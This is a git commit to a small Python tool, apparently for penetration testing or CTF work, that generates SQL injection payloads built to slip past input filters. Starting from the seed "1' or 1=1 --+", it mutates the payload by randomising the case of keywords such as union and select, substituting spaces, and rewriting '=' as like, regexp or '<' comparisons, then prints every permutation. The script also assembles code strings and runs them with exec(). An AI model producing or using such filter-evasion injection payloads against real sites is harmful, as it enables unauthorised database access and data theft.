4462645345bb0f3b714756ead1e8bd70d4db2637
saulty4ish <saulty4ish@github.com>
2022-06-13 10:36:58 -0400

    fix EqualBypass

--- module/EqualBypass.py
+++ module/EqualBypass.py
@@ -1,6 +1,26 @@
+import re
 def EqualBypass(source):
     rets=[]
     for exp in source:
         output=exp.replace("="," like ")
+        output1=exp.replace("=","  regexp '") + "'"
+        
+        rets.append(output1)
         rets.append(output)
+        
+        '''
+        output2=exp.split("=")
+        part1=int(output2[1])
+        part2=int(output2[1])+1
+        outpu3=output2[0] +" < "+str(part2)
+        rets.append(outpu3)
+	'''
+        
+        r=re.findall(r"([\d]+[\s\S]*)=[\s\S]*?([\d]+)",exp)
+        part1=r[0][0]
+        part2=int(r[0][1]) + 1
+        outpu3=part1 + "<" + str(part2)
+        rets.append(outpu3)
     return rets
+
+
--- run.py
+++ run.py
@@ -1,52 +1,35 @@
+from module.Space2Payload import *
+from module.UpperCase import *
+from module.EqualBypass import *
 from itertools import permutations
 
-def UpperCase(source):
-    ret=[]
-    len_source=len(source)
-    
-    quantity_to_change_buffer=[]
-    for i in range(0,len_source):
-        quantity_to_change_buffer.append(i)
-    for quantity_to_change in quantity_to_change_buffer:
-        index_to_change_buffer=getIndex(quantity_to_change+1,quantity_to_change_buffer)
-        for index_list in index_to_change_buffer:
-            temp_source=[]
-            for c in source:
-                temp_source.append(c)
-            
-            for i in range(0,len_source):
-                for index in index_list:
-                    if index == i:
-                        temp_source[index]=source[index].upper()
-            temp_source_str=""
-            for c_str in temp_source:
-                temp_source_str=temp_source_str+str(c_str)
-            ret.append(temp_source_str)
-    return list(set(ret))
- 
+funcs=[UpperCaseMain,Space2Payload,EqualBypass]
 
-def getIndex(num,buffer):
-    indexs=[]
-    init_index=0
-    for str_tmp in permutations(buffer,num):
-        indexs.append(list(str_tmp))
-    return indexs
-    
-def UpperCaseMain(source):
-    for exp in source:
-        rets=[]
-        while_list=["and","union","select","or"]
-        for s in while_list:
-            if s in exp.lower():
-                payloads=UpperCase(s)
-                for payload in payloads:
-                    #print(payload)
-                    ret=exp.lower().replace(s,payload)
-                    rets.append(ret)
-    return rets
+init=["1' or 1=1 --+"]
 
-#print(UpperCase("Union Select"))
-#print(UpperCaseMain(["and"]))
+def convert(f,l=[]):
+    return f(l)
 
 
+for toselect in range(1,len(funcs)+1):
+    for func_set in permutations(funcs,toselect):
+        flag=0
+        init_parm0=init
+        for i in range(0, len(func_set)):
+            while flag < len(func_set):
+                init_parm = "func_set["+str(flag)+"]"
+                if flag == 0:
+                    init_parm0 = "convert("+init_parm+","+str(init_parm0)+")"
+                    flag = flag+1
+                    #code="print("+init_parm0+")"
+                else:
+                    init_parm0 = "convert("+init_parm+","+init_parm0+")"
+                    #code="print("+"convert("+init_parm+","+init_parm0+")"+")"
+                    flag = flag+1
+        code = init_parm0
+        #print(func_set)
+        #print(code)
+        
+        code = '''p = %s\nfor k in p:\n print(k)'''%(code)
+        exec(code)
 
